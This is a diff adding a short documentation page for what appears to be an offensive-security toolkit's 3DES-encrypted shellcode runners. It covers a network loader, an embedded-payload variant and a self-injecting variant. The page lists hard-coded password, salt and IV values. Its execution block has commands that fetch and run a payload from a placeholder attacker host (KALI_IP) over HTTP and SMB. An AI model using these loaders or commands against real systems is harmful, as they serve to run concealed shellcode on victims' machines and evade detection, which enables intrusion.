@@ -1,0 +1,23 @@
+---
+title: "Triple DES"
+description: "3DES-encrypted shellcode runners."
+---
+
+Runners located under `payloads/3DES/`:
+- `des_decryptor.exe` — loads shellcode runner from network path
+- `des_decryptor_embedded.exe` — shellcode embedded (base64 + 3DES encrypted)
+- `des_decryptor_embedded_marshal.exe` — injects into its own process memory
+
+**Static credentials (modify as needed):**
+- Password: `oqphnbt0kuedizy4m3avx6r5lf21jc8s`
+- Salt: `vh9b4tsxrl1560wg8nda2meuc7yjzop3`
+- IV: `SBFTWSDXBYVOEMTD`
+
+## Execution
+
+```cmd
+des_decryptor.exe http://KALI_IP/des_decryptor_embedded.exe
+des_decryptor.exe smb://KALI_IP/des_decryptor_embedded.exe
+des_decryptor_embedded.exe
+des_decryptor_embedded_marshal.exe
+```
